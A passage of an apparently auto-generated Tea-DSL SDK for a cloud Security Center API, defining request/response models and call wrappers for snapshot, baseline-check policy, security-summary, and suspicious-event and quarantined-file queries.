  uuid?: string(name='Uuid'),
}

model DescribeSnapshotsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    nextToken?: string(name='NextToken'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  snapshots?: [ 
    {
      actualBytes?: long(name='ActualBytes'),
      actualItems?: long(name='ActualItems'),
      bytesDone?: long(name='BytesDone'),
      bytesTotal?: long(name='BytesTotal'),
      clientId?: string(name='ClientId'),
      clientVersion?: string(name='ClientVersion'),
      createdTime?: long(name='CreatedTime'),
      errorFile?: string(name='ErrorFile'),
      instanceId?: string(name='InstanceId'),
      itemsDone?: long(name='ItemsDone'),
      itemsTotal?: long(name='ItemsTotal'),
      jobId?: string(name='JobId'),
      parentSnapshotHash?: string(name='ParentSnapshotHash'),
      path?: string(name='Path'),
      paths?: [ string ](name='Paths'),
      planId?: string(name='PlanId'),
      regionId?: string(name='RegionId'),
      retention?: long(name='Retention'),
      snapshotHash?: string(name='SnapshotHash'),
      snapshotId?: string(name='SnapshotId'),
      sourceType?: string(name='SourceType'),
      status?: string(name='Status'),
      uuid?: string(name='Uuid'),
      vaultId?: string(name='VaultId'),
    }
  ](name='Snapshots'),
}

model DescribeSnapshotsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSnapshotsResponseBody(name='body'),
}

async function describeSnapshotsWithOptions(request: DescribeSnapshotsRequest, runtime: Util.RuntimeOptions): DescribeSnapshotsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.apiVersion)) {
    query['ApiVersion'] = request.apiVersion;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.isAliYunEcs)) {
    query['IsAliYunEcs'] = request.isAliYunEcs;
  }
  if (!Util.isUnset(request.machineRegion)) {
    query['MachineRegion'] = request.machineRegion;
  }
  if (!Util.isUnset(request.machineRemark)) {
    query['MachineRemark'] = request.machineRemark;
  }
  if (!Util.isUnset(request.nextToken)) {
    query['NextToken'] = request.nextToken;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSnapshots',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSnapshots(request: DescribeSnapshotsRequest): DescribeSnapshotsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSnapshotsWithOptions(request, runtime);
}

model DescribeStrategyRequest {
  customType?: string(name='CustomType'),
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
  strategyIds?: string(name='StrategyIds'),
}

model DescribeStrategyResponseBody = {
  requestId?: string(name='RequestId'),
  strategies?: [ 
    {
      configTargets?: [ 
        {
          flag?: string(name='Flag'),
          target?: string(name='Target'),
          targetType?: string(name='TargetType'),
        }
      ](name='ConfigTargets'),
      customType?: string(name='CustomType'),
      cycleDays?: int32(name='CycleDays'),
      cycleStartTime?: int32(name='CycleStartTime'),
      ecsCount?: int32(name='EcsCount'),
      endTime?: string(name='EndTime'),
      execStatus?: int32(name='ExecStatus'),
      id?: int32(name='Id'),
      name?: string(name='Name'),
      passRate?: int32(name='PassRate'),
      processRate?: int32(name='ProcessRate'),
      riskCount?: int32(name='RiskCount'),
      startTime?: string(name='StartTime'),
      type?: int32(name='Type'),
    }
  ](name='Strategies'),
}

model DescribeStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyResponseBody(name='body'),
}

async function describeStrategyWithOptions(request: DescribeStrategyRequest, runtime: Util.RuntimeOptions): DescribeStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.customType)) {
    query['CustomType'] = request.customType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyIds)) {
    query['StrategyIds'] = request.strategyIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeStrategy(request: DescribeStrategyRequest): DescribeStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyWithOptions(request, runtime);
}

model DescribeStrategyDetailRequest {
  id?: string(name='Id', description='The ID of the baseline check policy.', example='123456'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeStrategyDetailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C5B28F65-9245-5DC1-B3CF-5F2756A756A8'),
  strategy?: {
    customType?: string(name='CustomType', description='The type of the baseline check policy. Valid values:

*   **common**: standard baseline check policy
*   **custom**: custom baseline check policy', example='common'),
    cycleDays?: int32(name='CycleDays', description='The check interval of the policy.', example='3'),
    cycleStartTime?: int32(name='CycleStartTime', description='The time period during which the check starts. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00', example='0'),
    endTime?: string(name='EndTime', description='The time when the baseline check based on the baseline check policy ends.', example='03:00:00'),
    id?: int32(name='Id', description='The ID of the baseline check policy.', example='123'),
    name?: string(name='Name', description='The name of the baseline check policy.', example='TestStrategy'),
    riskSubTypeName?: string(name='RiskSubTypeName', description='The subtype of the baselines.', example='hc_nginx_linux,tomcat7,hc_mysql_ali,hc_docker'),
    riskTypeWhiteListQueryResultList?: [ 
      {
        alias?: string(name='Alias', description='The alias of the check item.', example='Unauthorized Access'),
        on?: boolean(name='On', description='Indicates whether the risk item is selected. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
        subTypes?: [ 
          {
            alias?: string(name='Alias', description='The alias of the sub-check item.', example='Redis unauthorized access high exploit vulnerability risk'),
            checkDetails?: [ 
              {
                checkDesc?: string(name='CheckDesc', description='The description of the check item.', example='Set password expiration time, force regular modification of password, reduce password leakage and guess risk.Use non-password login (e.g. key pair) please ignore this item.'),
                checkId?: long(name='CheckId', description='The ID of the check item.', example='206'),
                checkItem?: string(name='CheckItem', description='The check item.', example='Ensure password expiration period is set.'),
                rules?: [ 
                  {
                    defaultValue?: int32(name='DefaultValue', description='The default value of the rule.', example='2'),
                    optional?: int32(name='Optional', description='Indicates whether the rule is included in the policy. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
                    paramList?: [ 
                      {
                        enumValue?: string(name='EnumValue', description='If the value of paramType is 2, this parameter provides the options that can be selected for the rule parameter.', example='0,1,2,3'),
                        maxValue?: int32(name='MaxValue', description='The maximum value of the rule parameter.', example='999'),
                        minValue?: int32(name='MinValue', description='The minimum value of the rule parameter.', example='1'),
                        paramDefaultValue?: string(name='ParamDefaultValue', description='The default value of the rule parameter.', example='7'),
                        paramDesc?: string(name='ParamDesc', description='The description of the rule parameter.', example='The setting value is 0 means no definition, 1 means success, 2 means failure, 3 means success and failure'),
                        paramName?: string(name='ParamName', description='The name of the rule parameter.', example='range_val'),
                        paramType?: int32(name='ParamType', description='The type of the rule parameter. Valid values:

*   **1**: input
*   **2**: selection', example='1'),
                        value?: string(name='Value', description='The specified value of the rule parameter.', example='7'),
                      }
                    ](name='ParamList', description='An array that consists of the rule parameters.'),
                    ruleDesc?: string(name='RuleDesc', description='The description of the rule.', example='Please customize the password expiration time detection standard as'),
                    ruleId?: string(name='RuleId', description='The ID of the rule.', example='login_unlock_deny_pam_faillock.must.cus'),
                  }
                ](name='Rules', description='An array that consists of the details of rules.'),
              }
            ](name='CheckDetails', description='An array that consists of the details of custom check items.'),
            on?: boolean(name='On', description='Indicates whether the sub-risk item is selected. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
            typeName?: string(name='TypeName', description='The type of the sub-check item.', example='hc_exploit_redis'),
          }
        ](name='SubTypes', description='An array that consists of sub-risk items.'),
        typeName?: string(name='TypeName', description='The check item.', example='hc_exploit'),
      }
    ](name='RiskTypeWhiteListQueryResultList', description='An array that consists of the whitelist of risk items.'),
    startTime?: string(name='StartTime', description='The time when the baseline check based on the baseline check policy starts.', example='02:00:00'),
    targetType?: string(name='TargetType', description='The condition by which the baseline check policy is applied to the asset. Valid values:

*   **groupId**: the ID of the asset group
*   **uuid**: the UUID of the asset', example='groupId'),
    type?: int32(name='Type', description='The type of the baseline check policy. Valid values:

*   **1**: standard baseline check policy
*   **2**: custom baseline check policy', example='1'),
  }(name='Strategy', description='The information about the baseline check policy.'),
}

model DescribeStrategyDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyDetailResponseBody(name='body'),
}

async function describeStrategyDetailWithOptions(request: DescribeStrategyDetailRequest, runtime: Util.RuntimeOptions): DescribeStrategyDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategyDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeStrategyDetail(request: DescribeStrategyDetailRequest): DescribeStrategyDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyDetailWithOptions(request, runtime);
}

model DescribeStrategyExecDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  strategyId?: int32(name='StrategyId', description='The ID of the baseline check policy.', example='8437592'),
}

model DescribeStrategyExecDetailResponseBody = {
  endTime?: string(name='EndTime', description='The time when the baseline check ends.', example='2021-12-05 00:12:46'),
  failCount?: int32(name='FailCount', description='The number of check items that failed to pass the baseline check. This type of check item is considered risk items.', example='94'),
  failedEcsList?: [ 
    {
      IP?: string(name='IP', description='The IP address of the server on which the baseline check was performed.', example='115.28.XX.XX'),
      instanceName?: string(name='InstanceName', description='The name of the instance.', example='worker-k8s-for-cs-cf5741fb95c3a45d0864f0e4544dc****'),
      internetIp?: string(name='InternetIp', description='The public IP address.', example='115.28.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address.', example='172.31.XX.XX'),
      reason?: string(name='Reason', description='The failure cause for the check item.', example='Detect timeout'),
    }
  ](name='FailedEcsList', description='An array consisting of the servers on which risk items were detected.'),
  inProcessCount?: int32(name='InProcessCount', description='The number of tasks that are **running** based on the baseline check policy.', example='0'),
  percent?: string(name='Percent', description='The execution progress of the baseline check policy.', example='100%'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='01611D72-1E33-53F5-A9A5-C81B5561970F'),
  source?: string(name='Source', description='The type of the baseline check. Valid values:

*   **Schedule**: automatic check that periodically runs
*   **Manual**: intermediate check that is manually performed', example='Manual'),
  startTime?: string(name='StartTime', description='The time when the baseline check starts.', example='2021-12-05 00:12:16'),
  successCount?: int32(name='SuccessCount', description='The number of check items that **passed** the baseline check.', example='81'),
}

model DescribeStrategyExecDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyExecDetailResponseBody(name='body'),
}

async function describeStrategyExecDetailWithOptions(request: DescribeStrategyExecDetailRequest, runtime: Util.RuntimeOptions): DescribeStrategyExecDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategyExecDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeStrategyExecDetail(request: DescribeStrategyExecDetailRequest): DescribeStrategyExecDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyExecDetailWithOptions(request, runtime);
}

model DescribeStrategyTargetRequest {
  config?: string(name='Config', description='The ID of the baseline check policy.', example='{"strategyId":8167126}'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.X.X'),
  type?: string(name='Type', description='The type of the policy. Set the value to hc_strategy, which indicates baseline check policies.', example='hc_strategy'),
}

model DescribeStrategyTargetResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='001BAB34-D70A-54B0-B1D7-91B76DCDD8E8'),
  strategyTargets?: [ 
    {
      bindUuidCount?: int32(name='BindUuidCount', description='The number of the assets that belong to the asset group.', example='85'),
      flag?: string(name='Flag', description='Indicates whether the baseline check policy is applied to the asset group. Valid values:

*   **add**: yes
*   **del**: no', example='add'),
      target?: string(name='Target', description='The ID of the asset group to which the assets belong or the UUID of the asset.', example='9165712'),
      targetType?: string(name='TargetType', description='The method that is used to add the assets to the baseline check policy. Valid values:

*   **groupId**: the ID of the asset group
*   **uuid**: the UUID of the asset', example='groupId'),
    }
  ](name='StrategyTargets', description='An array consisting of the assets to which the baseline check policy is applied.'),
}

model DescribeStrategyTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyTargetResponseBody(name='body'),
}

async function describeStrategyTargetWithOptions(request: DescribeStrategyTargetRequest, runtime: Util.RuntimeOptions): DescribeStrategyTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategyTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeStrategyTarget(request: DescribeStrategyTargetRequest): DescribeStrategyTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyTargetWithOptions(request, runtime);
}

model DescribeSummaryInfoRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeSummaryInfoResponseBody = {
  aegisClientOfflineCount?: int32(name='AegisClientOfflineCount', description='The number of unprotected assets.', example='12'),
  aegisClientOnlineCount?: int32(name='AegisClientOnlineCount', description='The number of protected assets.', example='127'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D40198E1-6EA8-482E-B3C7-D9573D75C0CA'),
  securityScore?: int32(name='SecurityScore', description='The security score of the assets. Valid values:

*   95 to 100: The assets are secure.
*   85 to 94: The assets are exposed to a few security risks. We recommend that you reinforce your security system in a timely manner.
*   70 to 84: The assets are exposed to multiple security risks. We recommend that you reinforce your security system in a timely manner.
*   69 or lower: The current security system is unable to protect the assets against intrusions. We recommend that you reinforce your security system at the earliest opportunity.', example='44'),
  success?: boolean(name='Success', description='Indicates whether the request is successful. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model DescribeSummaryInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSummaryInfoResponseBody(name='body'),
}

async function describeSummaryInfoWithOptions(request: DescribeSummaryInfoRequest, runtime: Util.RuntimeOptions): DescribeSummaryInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSummaryInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSummaryInfo(request: DescribeSummaryInfoRequest): DescribeSummaryInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSummaryInfoWithOptions(request, runtime);
}

model DescribeSupportRegionResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2C0699D3-4107-5A46-A4C4-E129A5967788'),
  supportRegion?: [ string ](name='SupportRegion', description='The regions in which the anti-ransomware feature is supported.'),
}

model DescribeSupportRegionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSupportRegionResponseBody(name='body'),
}

async function describeSupportRegionWithOptions(runtime: Util.RuntimeOptions): DescribeSupportRegionResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeSupportRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSupportRegion(): DescribeSupportRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSupportRegionWithOptions(runtime);
}

model DescribeSuspEventDetailRequest {
  from?: string(name='From', description='The data source of the exception. Set the value to sas.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='121.33.XX.XX'),
  suspiciousEventId?: int32(name='SuspiciousEventId', description='The ID of the exception.', example='32750999'),
}

model DescribeSuspEventDetailResponseBody = {
  canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether the online processing of exceptions is supported, such as blocking an exception, adding an exception to the whitelist, and ignoring an exception. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  dataSource?: string(name='DataSource', description='The data source of the exception.', example='aegis_suspicious_****'),
  details?: [ 
    {
      nameDisplay?: string(name='NameDisplay', description='The display name of the alert event.', example='Trojan Path'),
      type?: string(name='Type', description='The format in which the details about the exception are displayed.

Valid values:

*   **text**
*   **html**', example='html'),
      value?: string(name='Value', description='The attribute information about the exception. For example, if the exception is associated with an alert that is triggered by an unusual logon, the information can include the time when the logon is initiated and the location from which the logon is initiated. If the exception is associated with an alert that is triggered by a webshell file, the information can include the path of the trojan file and the type of the trojan.', example='getopt'),
    }
  ](name='Details', description='The details about the exception.'),
  eventDesc?: string(name='EventDesc', description='The description of the exception.', example='The detection model found a suspicious Webshell file on your server, which may be a backdoor file implanted to maintain permissions after the attacker successfully invaded the website.'),
  eventName?: string(name='EventName', description='The name of the exception.', example='WEBSHELL'),
  eventStatus?: string(name='EventStatus', description='The status of the exception. Valid values:

*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
*   **8**: marked as a false positive
*   **16**: handling
*   **32**: handled
*   **64**: expired', example='1'),
  eventTypeDesc?: string(name='EventTypeDesc', description='The type of the exception.', example='Malicious Software-Variable Trojan'),
  id?: int32(name='Id', description='The ID of the exception.', example='11416624'),
  instanceName?: string(name='InstanceName', description='The name of the server on which the exception was detected.', example='ca_cpm_****'),
  internetIp?: string(name='InternetIp', description='The public IP address of the server on which the exception was detected.', example='101.132.XX.XX'),
  intranetIp?: string(name='IntranetIp', description='The private IP address of the server on which the exception was detected.', example='172.26.XX.XX'),
  lastTime?: string(name='LastTime', description='The time when the exception was last detected.', example='2018-10-30 11:43:46'),
  level?: string(name='Level', description='The severity of the exception. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
  operateErrorCode?: string(name='OperateErrorCode', description='The code that indicates the handling result of the exception.', example='quara.Succes'),
  operateMsg?: string(name='OperateMsg', description='The message that indicates the handling result of the exception.', example='success'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  saleVersion?: string(name='SaleVersion', description='The edition of Security Center in which the exception can be detected. Valid values:

*   **0**: Basic edition
*   **1**: Advanced edition
*   **2**: Enterprise edition', example='1'),
  uuid?: string(name='Uuid', description='The UUID of the server on which the exception was detected.', example='bffb12c3-590a-4db2-b538-****'),
}

model DescribeSuspEventDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventDetailResponseBody(name='body'),
}

async function describeSuspEventDetailWithOptions(request: DescribeSuspEventDetailRequest, runtime: Util.RuntimeOptions): DescribeSuspEventDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.suspiciousEventId)) {
    query['SuspiciousEventId'] = request.suspiciousEventId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEventDetail(request: DescribeSuspEventDetailRequest): DescribeSuspEventDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventDetailWithOptions(request, runtime);
}

model DescribeSuspEventExportInfoRequest {
  exportId?: int32(name='ExportId', example='123'),
}

model DescribeSuspEventExportInfoResponseBody = {
  exportStatus?: string(name='ExportStatus', example='success'),
  fileName?: string(name='FileName', example='suspicious_event_20221221_1671590521234.zip'),
  gmtCreate?: long(name='GmtCreate', example='2022-12-20T15:18Z'),
  gmtModified?: long(name='GmtModified', example='2022-12-20T15:18Z'),
  id?: int32(name='Id', example='11'),
  link?: string(name='Link', example='http://suspicious-xxxxxxx.oss-cn-shanghai.aliyuncs.com/xxxxxxxxxxx/suspicious_event_20221221_1671590525269.zip?Expires=1671594125&OSSAccessKeyId=LTAIxxxxxxxxxxxxxx&Signature=xxxxxxxxxxxxxxxxxx'),
  progress?: int32(name='Progress', example='100'),
  properties?: string(name='Properties', example='id,eventSubType,eventDetail,level,status,ip,instanceName,desc,lastTime,operateTime,note'),
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578AXXXXX'),
  totalCount?: int32(name='TotalCount', example='1'),
  type?: string(name='Type', example='suspiciousEvent'),
}

model DescribeSuspEventExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventExportInfoResponseBody(name='body'),
}

async function describeSuspEventExportInfoWithOptions(request: DescribeSuspEventExportInfoRequest, runtime: Util.RuntimeOptions): DescribeSuspEventExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEventExportInfo(request: DescribeSuspEventExportInfoRequest): DescribeSuspEventExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventExportInfoWithOptions(request, runtime);
}

model DescribeSuspEventQuaraFilesRequest {
  currentPage?: string(name='CurrentPage', description='The number of the page to return.', example='1'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  groupId?: string(name='GroupId', description='The ID of the asset group.', example='10541428', deprecated='true'),
  groupingId?: long(name='GroupingId', description='The ID of the server group to which the server belongs. The quarantined file is located on the server.', example='11472451'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page.', example='20'),
  quaraTag?: string(name='QuaraTag', description='The unique ID of the quarantined file.', example='a31337789f64d39b2219733ec99f9af7'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.82.XX.XX'),
  status?: string(name='Status', description='The status of the quarantined file that you want to query. Valid values:

*   **quaraFailed**: The file fails to be quarantined.
*   **quaraDone**: The file is quarantined.
*   **quaraing**: The file is being quarantined.
*   **rollbackFailed**: The system fails to cancel quarantining the file.
*   **rollbackDone**: The system cancelled quarantining the file.
*   **rollbacking**: The system is cancelling quarantining the file.', example='quaraDone'),
}

model DescribeSuspEventQuaraFilesResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='7'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  quaraFiles?: [ 
    {
      eventName?: string(name='EventName', description='The name of the event.', example='WEBSHELL'),
      eventType?: string(name='EventType', description='The type of the event.', example='WebshellQuaraEventType'),
      id?: int32(name='Id', description='The ID of the quarantined file.', example='26918'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-2ze9t1qp36n1436m****'),
      instanceName?: string(name='InstanceName', description='The name of the server on which the quarantined file is located.', example='iZwz98dkiw3vbrtqrt5v****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server on which the quarantined file is located.', example='47.XX.XX.131'),
      ip?: string(name='Ip', description='The public IP address of the server on which the quarantined file is located.', example='47.XX.XX.131'),
      link?: string(name='Link', description='The download link of the quarantined file.', example='https://xxx.xxx/xxx'),
      md5?: string(name='Md5', description='The MD5 hash value of the quarantined file.', example='5ddebe926acc7ed39a664409bfd0ec10'),
      modifyTime?: string(name='ModifyTime', description='The time when the quarantined file was last modified.', example='2020-06-11 20:37:08'),
      path?: string(name='Path', description='The path to the quarantined file on the server.', example='/var/www/html/webshell-sample-master/others/defc3e21bab59e2a2ab49f7eda99f65f83d4d349.jpg'),
      status?: string(name='Status', description='The status of the quarantined file. Valid values:

*   **quaraFailed**: The file fails to be quarantined.
*   **quaraDone**: The file is quarantined.
*   **quaraing**: The file is being quarantined.
*   **rollbackFailed**: The system fails to cancel quarantining the file.
*   **rollbackDone**: The system cancelled quarantining the file.
*   **rollbacking**: The system is cancelling quarantining the file.', example='rollbackDone'),
      tag?: string(name='Tag', description='The unique ID of the event.', example='228f890e56eae9eec6a42c7ea801b538'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='04a0e735-ad32-4835-b635-0458d77b****'),
    }
  ](name='QuaraFiles', description='An array that consists of the quarantined files.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='32A73759-4C0F-4801-BE98-901223ACEE9A'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='38'),
}

model DescribeSuspEventQuaraFilesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventQuaraFilesResponseBody(name='body'),
}

async function describeSuspEventQuaraFilesWithOptions(request: DescribeSuspEventQuaraFilesRequest, runtime: Util.RuntimeOptions): DescribeSuspEventQuaraFilesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.groupingId)) {
    query['GroupingId'] = request.groupingId;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.quaraTag)) {
    query['QuaraTag'] = request.quaraTag;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
